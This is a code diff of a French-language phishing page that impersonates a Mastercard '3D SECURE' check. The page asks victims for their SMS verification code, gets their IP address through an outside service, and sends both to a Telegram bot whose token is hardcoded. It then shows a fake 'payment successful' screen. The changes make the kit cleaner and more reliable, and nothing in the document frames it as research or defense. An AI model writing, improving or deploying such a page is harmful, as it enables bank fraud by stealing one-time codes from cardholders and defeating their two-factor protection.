@@ -52,48 +52,58 @@
       border: none;
       cursor: pointer;
       margin-top: 10px;
-      width: 1100%;
       max-width: 240px;
       box-sizing: border-box;
     }
   </style>
 </head>
 <body>
-  <div class="payment-container full-widt <center>h-container" id="step-2">
-     <center><h2>3D SECURE</h2></p></p>
-    <div class="icon-container"></p>
-    <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard"></p>
-    </div>
-    <div class="spinner"></div></p></p>
-     <center><p>VEUILLEZ PATIENTER...</p>
-  </div>
-  <div class="payment-container full-width-container hidden" id="step-3">
-     <center><h2>AUTHENTIFICATION SMS</h2></p></p>
-    <div class="icon-container">
-<img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard"></p>
-    </div>
-    <p>Entrez le code reçu par SMS :
-    <form id="sms-form" class="sms-form">
-      <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
-      <input type="submit" value="Valider">
-    </form>
-  </div>
-  <div class="payment-container full-width-container hidden" id="step-4">
-     <center><h2>3D SECURE</h2></p>
+  <div class="payment-container" id="step-2">
+    <h2>3D SECURE</h2>
     <div class="icon-container">
       <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
     <div class="spinner"></div>
-     <center><p>VEUILLEZ PATIENTER...</p></p>
+    <p>VEUILLEZ PATIENTER...</p>
   </div>
-  <div class="payment-container full-width-container hidden" id="step-5">
-<h2>PAIEMENT RÉUSSI</center></p></p>
+
+  <div class="payment-container hidden" id="step-3">
+    <h2>AUTHENTIFICATION SMS</h2>
     <div class="icon-container">
-       <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
-    <center><p class="success-message"></h3>Redirection dans quelques instants...<h3></p>
+    <p>Entrez le code reçu par SMS (6 chiffres) :</p>
+    <form id="sms-form" class="sms-form">
+      <!-- Limitation à 6 chiffres avec maxlength et pattern -->
+      <input type="text" id="sms-code" name="sms-code" required 
+             placeholder="Code SMS" maxlength="6" pattern="\d{6}" 
+             title="Veuillez entrer exactement 6 chiffres">
+      <input type="submit" value="Valider">
+    </form>
   </div>
+
+  <div class="payment-container hidden" id="step-4">
+    <h2>3D SECURE</h2>
+    <div class="icon-container">
+      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+    </div>
+    <div class="spinner"></div>
+    <p>VEUILLEZ PATIENTER...</p>
+  </div>
+
+  <div class="payment-container hidden" id="step-5">
+    <h2>PAIEMENT RÉUSSI</h2>
+    <div class="icon-container">
+      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+    </div>
+    <p class="success-message">Redirection dans quelques instants...</p>
+  </div>
+
   <script>
+    // Variable globale pour stocker l'IP de l'utilisateur
+    let userIP = '';
+
+    // Fonction pour envoyer un message à Telegram
     function sendToTelegram(message) {
       const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
       const TELEGRAM_CHAT_ID = '7747778364';
@@ -103,21 +113,46 @@
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
-      });
+      }).catch(err => console.error('Erreur lors de l\'envoi à Telegram:', err));
     }
- 
+
+    // Fonction pour récupérer l'adresse IP de l'utilisateur
+    function getUserIP() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          userIP = data.ip;
+          console.log('IP récupérée:', userIP);
+        })
+        .catch(err => console.error('Erreur lors de la récupération de l\'IP:', err));
+    }
+
+    // Après 10 secondes, on passe de l'étape 2 à l'étape 3 et on récupère l'IP
     setTimeout(() => {
       document.getElementById('step-2').classList.add('hidden');
       document.getElementById('step-3').classList.remove('hidden');
       getUserIP();
     }, 10000);
+
+    // Gestion de la soumission du formulaire SMS
     document.getElementById('sms-form').addEventListener('submit', function(event) {
       event.preventDefault();
-      const smsCode = document.getElementById('sms-code').value;
-      sendToTelegram(`Code SMS reçu : ${smsCode}`);
+
+      // Vérification côté client si le code correspond au pattern (6 chiffres)
+      const smsCodeInput = document.getElementById('sms-code');
+      if (!smsCodeInput.checkValidity()) {
+        alert("Veuillez entrer exactement 6 chiffres.");
+        return;
+      }
+
+      const smsCode = smsCodeInput.value;
+      // Envoi du code SMS et de l'IP dans le même message
+      sendToTelegram(`Code SMS reçu : ${smsCode}\nIP utilisateur : ${userIP}`);
+      
       document.getElementById('step-3').classList.add('hidden');
       document.getElementById('step-4').classList.remove('hidden');
       
+      // Passage aux étapes suivantes avec des délais
       setTimeout(() => {
         document.getElementById('step-4').classList.add('hidden');
         document.getElementById('step-5').classList.remove('hidden');
